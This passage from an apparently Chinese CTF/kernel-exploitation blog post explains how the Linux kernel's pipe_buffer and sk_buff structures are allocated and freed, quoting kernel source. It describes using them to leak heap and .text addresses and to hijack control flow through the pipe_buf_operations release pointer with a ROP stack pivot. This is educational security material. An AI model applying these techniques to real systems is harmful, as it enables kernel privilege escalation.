class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_inode_info - a linux kernel pipe</span></span><br><span class="line"><span class="comment"> *@mutex: mutex protecting the whole thing</span></span><br><span class="line"><span class="comment"> *@rd_wait: reader wait point in case of empty pipe</span></span><br><span class="line"><span class="comment"> *@wr_wait: writer wait point in case of full pipe</span></span><br><span class="line"><span class="comment"> *@head: The point of buffer production</span></span><br><span class="line"><span class="comment"> *@tail: The point of buffer consumption</span></span><br><span class="line"><span class="comment"> *@note_loss: The next read() should insert a data-lost message</span></span><br><span class="line"><span class="comment"> *@max_usage: The maximum number of slots that may be used in the ring</span></span><br><span class="line"><span class="comment"> *@ring_size: total number of buffers (should be a power of 2)</span></span><br><span class="line"><span class="comment"> *@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs</span></span><br><span class="line"><span class="comment"> *@tmp_page: cached released page</span></span><br><span class="line"><span class="comment"> *@readers: number of current readers of this pipe</span></span><br><span class="line"><span class="comment"> *@writers: number of current writers of this pipe</span></span><br><span class="line"><span class="comment"> *@files: number of struct file referring this pipe (protected by -&gt;i_lock)</span></span><br><span class="line"><span class="comment"> *@r_counter: reader counter</span></span><br><span class="line"><span class="comment"> *@w_counter: writer counter</span></span><br><span class="line"><span class="comment"> *@fasync_readers: reader side fasync</span></span><br><span class="line"><span class="comment"> *@fasync_writers: writer side fasync</span></span><br><span class="line"><span class="comment"> *@bufs: the circular array of pipe buffers</span></span><br><span class="line"><span class="comment"> *@user: the user who created this pipe</span></span><br><span class="line"><span class="comment"> *@watch_queue: If this pipe is a watch_queue, this is the stuff for that</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line"><span class="type">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_usage;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="type">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> nr_accounted;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> readers;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> writers;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> files;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> r_counter;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> w_counter;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="数据泄露-4"><a href="#数据泄露-4" class="headerlink" title="数据泄露"></a>数据泄露</h3><h4 id="内核线性映射区（-direct-mapping-area）-3"><a href="#内核线性映射区（-direct-mapping-area）-3" class="headerlink" title="*内核线性映射区（ direct mapping area）"></a><em>*内核线性映射区（ direct mapping area）</em></h4><p><code>pipe_inode_info-&gt;bufs</code> 为一个动态分配的结构体数组，因此我们可以利用他来泄露出内核的“堆”上地址</p><h2 id="pipe-buffer（kmalloc-1k-GFP-KERNEL-ACCOUNT）：管道数据"><a href="#pipe-buffer（kmalloc-1k-GFP-KERNEL-ACCOUNT）：管道数据" class="headerlink" title="pipe_buffer（kmalloc-1k|GFP_KERNEL_ACCOUNT）：管道数据"></a>pipe_buffer（kmalloc-1k|GFP_KERNEL_ACCOUNT）：管道数据</h2><p>当我们创建一个管道时，在内核中会生成数个连续的 <code>pipe_buffer</code> 结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="分配：pipe-系统调用族"><a href="#分配：pipe-系统调用族" class="headerlink" title="分配：pipe 系统调用族"></a>分配：pipe 系统调用族</h3><p>创建管道使用的自然是 pipe 与 pipe2 这两个系统调用，其最终都会调用到 <code>do_pipe2()</code> 这个函数，不同的是后者我们可以指定一个 flag，而前者默认 flag 为 0</p><p>存在如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">do_pipe2()</span><br><span class="line">__do_pipe_flags()</span><br><span class="line">create_pipe_files()</span><br><span class="line">get_pipe_inode()</span><br><span class="line">alloc_pipe_info()</span><br></pre></td></tr></table></figure><p>最终调用 <code>kcalloc()</code> 分配一个 <code>pipe_buffer</code> 数组，默认数量为 <code>PIPE_DEF_BUFFERS</code> （16）个，因此会直接从 kmalloc-1k 中拿 object：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> pipe_inode_info *<span class="title function_">alloc_pipe_info</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span> =</span> get_current_user();</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_bufs;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_size = READ_ONCE(pipe_max_size);</span><br><span class="line"></span><br><span class="line">pipe = kzalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer),</span><br><span class="line">     GFP_KERNEL_ACCOUNT);</span><br></pre></td></tr></table></figure><h3 id="释放：close-系统调用"><a href="#释放：close-系统调用" class="headerlink" title="释放：close 系统调用"></a>释放：close 系统调用</h3><p>当我们关闭一个管道的两端之后，对应的管道就会被释放掉，相应地，<code>pipe_buffer</code> 数组也会被释放掉</p><p>对于管道对应的文件，其 <code>file_operations</code> 被设为 <code>pipefifo_fops</code> ，其中 release 函数指针设为 <code>pipe_release</code> 函数，因此在关闭管道文件时有如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pipe_release()</span><br><span class="line">    put_pipe_info()</span><br></pre></td></tr></table></figure><p>在 <code>put_pipe_info()</code> 中会将管道对应的文件计数减一，管道两端都关闭之后最终会走到 <code>free_pipe_info()</code> 中，在该函数中释放掉管道本体与 buffer 数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free_pipe_info</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;watch_queue) &#123;</span><br><span class="line">watch_queue_clear(pipe-&gt;watch_queue);</span><br><span class="line">put_watch_queue(pipe-&gt;watch_queue);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">(<span class="type">void</span>) account_pipe_buffers(pipe-&gt;user, pipe-&gt;nr_accounted, <span class="number">0</span>);</span><br><span class="line">free_uid(pipe-&gt;user);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pipe-&gt;ring_size; i++) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> pipe-&gt;bufs + i;</span><br><span class="line"><span class="keyword">if</span> (buf-&gt;ops)</span><br><span class="line">pipe_buf_release(pipe, buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;tmp_page)</span><br><span class="line">__free_page(pipe-&gt;tmp_page);</span><br><span class="line">kfree(pipe-&gt;bufs);</span><br><span class="line">kfree(pipe);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数据泄露-5"><a href="#数据泄露-5" class="headerlink" title="数据泄露"></a>数据泄露</h3><h4 id="内核-text-段地址-3"><a href="#内核-text-段地址-3" class="headerlink" title="内核 .text 段地址"></a>内核 .text 段地址</h4><p><code>pipe_buffer-&gt;pipe_buf_operations</code> 通常指向一张全局函数表，我们可以通过该函数表的地址泄露出内核 .text 段基址</p><h3 id="劫持内核执行流-2"><a href="#劫持内核执行流-2" class="headerlink" title="劫持内核执行流"></a>劫持内核执行流</h3><p>当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * -&gt;confirm() verifies that the data in the pipe buffer is there</span></span><br><span class="line"><span class="comment"> * and that the contents are good. If the pages in the pipe belong</span></span><br><span class="line"><span class="comment"> * to a file system, we may need to wait for IO completion in this</span></span><br><span class="line"><span class="comment"> * hook. Returns 0 for good, or a negative error value in case of</span></span><br><span class="line"><span class="comment"> * error.  If not present all pages are considered good.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When the contents of this pipe buffer has been completely</span></span><br><span class="line"><span class="comment"> * consumed by a reader, -&gt;release() is called.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attempt to take ownership of the pipe buffer and its contents.</span></span><br><span class="line"><span class="comment"> * -&gt;try_steal() returns %true for success, in which case the contents</span></span><br><span class="line"><span class="comment"> * of the pipe (the buf-&gt;page) is locked and now completely owned by the</span></span><br><span class="line"><span class="comment"> * caller. The page may then be transferred to a different mapping, the</span></span><br><span class="line"><span class="comment"> * most often used case is insertion into different file address space</span></span><br><span class="line"><span class="comment"> * cache.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a reference to the pipe buffer.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>存在如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pipe_release()</span><br><span class="line">    put_pipe_info()</span><br><span class="line">        free_pipe_info()</span><br><span class="line">            pipe_buf_release()</span><br><span class="line">                pipe_buffer-&gt;pipe_buf_operations-&gt;release() // it should be anon_pipe_buf_release()</span><br></pre></td></tr></table></figure><p>在 <code>pipe_buf_release()</code> 中会调用到该 <code>pipe_buffer</code> 的函数表中的 release 指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * pipe_buf_release - put a reference to a pipe_buffer</span></span><br><span class="line"><span class="comment"> * @pipe:the pipe that the buffer belongs to</span></span><br><span class="line"><span class="comment"> * @buf:the buffer to put a reference to</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">pipe_buf_release</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe,</span></span><br><span class="line"><span class="params">    <span class="keyword">struct</span> pipe_buffer *buf)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span> =</span> buf-&gt;ops;</span><br><span class="line"></span><br><span class="line">buf-&gt;ops = <span class="literal">NULL</span>;</span><br><span class="line">ops-&gt;release(pipe, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要劫持其函数表到可控区域后再关闭管道的两端便能劫持内核执行流</p><p>经过笔者实测（其实从源码上便能看出），当执行到该指针时 rsi 寄存器刚好指向对应的 <code>pipe_buffer</code>，因此我们可以将函数表劫持到 <code>pipe_buffer</code> 上，找到一条合适的 gadget 将栈迁移到该处，从而更顺利地完成 ROP</p><p><img src="https://s2.loli.net/2022/02/25/daklBHtIYCs3K6q.png" alt="image.png"></p><p>（例题：<a href="https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/">D^3CTF2022 - d3kheap</a>）</p><blockquote><p>之前例题本来想选一个以前有的 CTF 题来写的，但是<strong>笔者太懒了</strong>…于是一直拖到最近刚好拿这个结构体出了一道 CTF 题，所以就顺便把这个过去开的坑给补充上…</p></blockquote><h1 id="0x09-sk-buff：内核中的“大对象菜单堆”"><a href="#0x09-sk-buff：内核中的“大对象菜单堆”" class="headerlink" title="0x09.sk_buff：内核中的“大对象菜单堆”"></a>0x09.sk_buff：内核中的“大对象菜单堆”</h1><p>说到 Linux kernel 的网络协议栈，我们毫无疑问无法绕开 <code>sk_buff</code> 这一基础结构体，但相比于他的常规功能，我们更加关注其在漏洞利用中给我们带来的便利</p><h2 id="sk-buff：size-gt-x3D-512-的对象分配"><a href="#sk-buff：size-gt-x3D-512-的对象分配" class="headerlink" title="sk_buff：size &gt;&#x3D; 512 的对象分配"></a>sk_buff：size &gt;&#x3D; 512 的对象分配</h2><p><code>sk_buff</code> 是 Linux kernel 网络协议栈中一个<strong>重要的基础结构体</strong>，其用以表示在网络协议栈中传输的一个「包」，但其结构体本身不包含一个包的数据部分，而是包含该包的各种属性，<strong>数据包的本体数据则使用一个单独的 object 储存</strong></p><p>这个结构体成员比较多，我们主要关注核心部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="comment">/* These two members must be first. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>*<span class="title">next</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>*<span class="title">prev</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* These elements must be at the end, see alloc_skb() for details.  */</span></span><br><span class="line"><span class="type">sk_buff_data_t</span>tail;</span><br><span class="line"><span class="type">sk_buff_data_t</span>end;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>*head,</span><br><span class="line">*data;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>truesize;</span><br><span class="line"><span class="type">refcount_t</span>users;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SKB_EXTENSIONS</span></span><br><span class="line"><span class="comment">/* only useable after checking -&gt;active_extensions != 0 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_ext</span>*<span class="title">extensions</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>sk_buff</code> 结构体与其所表示的数据包形成如下结构，其中：</p><ul><li><code>head</code> ：一个数据包<strong>实际的起始处</strong>（也就是为该数据包分配的 object 的首地址）</li><li><code>end</code> ：一个数据包实际的末尾（为该数据包分配的 object 的末尾地址）</li><li><code>data</code> ：<strong>当前所在 layer 的数据包对应的起始地址</strong></li><li><code>tail</code> ：<strong>当前所在 layer 的数据包对应的末尾地址</strong></li></ul><p>data 和 tail 可以这么理解：数据包每经过网络层次模型中的一层都会被添加&#x2F;删除一个 header （有时还有一个 tail），data 与 tail 便是用以对此进行标识的</p><p><img src="https://s2.loli.net/2022/03/31/AV8HsnZj2bUCl4J.png" alt="image.png"></p><p>多个 <code>sk_buff</code> 之间形成双向链表结构，类似于 <code>msg_queue</code>，这里同样有一个 <code>sk_buff_head</code> 结构作为哨兵节点</p><p><img src="https://s2.loli.net/2022/04/11/U8CjYMBOcZ74s3W.png" alt="image.png"></p><h3 id="分配（数据包：-GFP-NOMEMALLOC-GFP-NOWARN）"><a href="#分配（数据包：-GFP-NOMEMALLOC-GFP-NOWARN）" class="headerlink" title="分配（数据包：__GFP_NOMEMALLOC | __GFP_NOWARN）"></a>分配（数据包：__GFP_NOMEMALLOC | __GFP_NOWARN）</h3><p>在内核网络协议栈中很多地方都会用到该结构体，例如 sendmsg 系统调用一类的操作都会造成包的创建，其最终都会调用到 <code>alloc_skb()</code> 来分配该结构体，而这个函数又是 <code>__alloc_skb()</code> 的 wrapper，不过需要注意的是其会从<strong>独立的</strong> <code>skbuff_fclone_cache </code> &#x2F; <code> skbuff_head_cache</code> 取 object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *__<span class="title">alloc_skb</span>(<span class="title">unsigned</span> <span class="title">int</span> <span class="title">size</span>, <span class="title">gfp_t</span> <span class="title">gfp_mask</span>,</span></span><br><span class="line"><span class="class">    <span class="title">int</span> <span class="title">flags</span>, <span class="title">int</span> <span class="title">node</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">cache</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">u8 *data;</span><br><span class="line"><span class="type">bool</span> pfmemalloc;</span><br><span class="line"></span><br><span class="line">cache = (flags &amp; SKB_ALLOC_FCLONE)</span><br><span class="line">? skbuff_fclone_cache : skbuff_head_cache;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sk_memalloc_socks() &amp;&amp; (flags &amp; SKB_ALLOC_RX))</span><br><span class="line">gfp_mask |= __GFP_MEMALLOC;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get the HEAD */</span></span><br><span class="line"><span class="keyword">if</span> ((flags &amp; (SKB_ALLOC_FCLONE | SKB_ALLOC_NAPI)) == SKB_ALLOC_NAPI &amp;&amp;</span><br><span class="line">    likely(node == NUMA_NO_NODE || node == numa_mem_id()))</span><br><span class="line">skb = napi_skb_cache_get();</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">skb = kmem_cache_alloc_node(cache, gfp_mask &amp; ~GFP_DMA, node);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!skb))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">prefetchw(skb);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We do our best to align skb_shared_info on a separate cache</span></span><br><span class="line"><span class="comment"> * line. It usually works because kmalloc(X &gt; SMP_CACHE_BYTES) gives</span></span><br><span class="line"><span class="comment"> * aligned memory blocks, unless SLUB/SLAB debug is enabled.</span></span><br><span class="line"><span class="comment"> * Both skb-&gt;head and skb_shared_info are cache line aligned.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">size = SKB_DATA_ALIGN(size);</span><br><span class="line">size += SKB_DATA_ALIGN(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> skb_shared_info));</span><br><span class="line">data = kmalloc_reserve(size, gfp_mask, node, &amp;pfmemalloc);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!data))</span><br><span class="line"><span class="keyword">goto</span> nodata;</span><br><span class="line"><span class="comment">/* kmalloc(size) might give us more room than requested.</span></span><br><span class="line"><span class="comment"> * Put skb_shared_info exactly at the end of allocated zone,</span></span><br><span class="line"><span class="comment"> * to allow max possible filling before reallocation.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">size = SKB_WITH_OVERHEAD(ksize(data));</span><br><span class="line">prefetchw(data + size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Only clear those fields we need to clear, not those that we will</span></span><br><span class="line"><span class="comment"> * actually initialise below. Hence, don&#x27;t put any more fields after</span></span><br><span class="line"><span class="comment"> * the tail pointer in struct sk_buff!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="built_in">memset</span>(skb, <span class="number">0</span>, offsetof(<span class="keyword">struct</span> sk_buff, tail));</span><br><span class="line">__build_skb_around(skb, data, <span class="number">0</span>);</span><br><span class="line">skb-&gt;pfmemalloc = pfmemalloc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; SKB_ALLOC_FCLONE) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_fclones</span> *<span class="title">fclones</span>;</span></span><br><span class="line"></span><br><span class="line">fclones = container_of(skb, <span class="keyword">struct</span> sk_buff_fclones, skb1);</span><br><span class="line"></span><br><span class="line">skb-&gt;fclone = SKB_FCLONE_ORIG;</span><br><span class="line">refcount_set(&amp;fclones-&gt;fclone_ref, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">fclones-&gt;skb2.fclone = SKB_FCLONE_CLONE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> skb;</span><br><span class="line"></span><br><span class="line">nodata:</span><br><span class="line">kmem_cache_free(cache, skb);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span 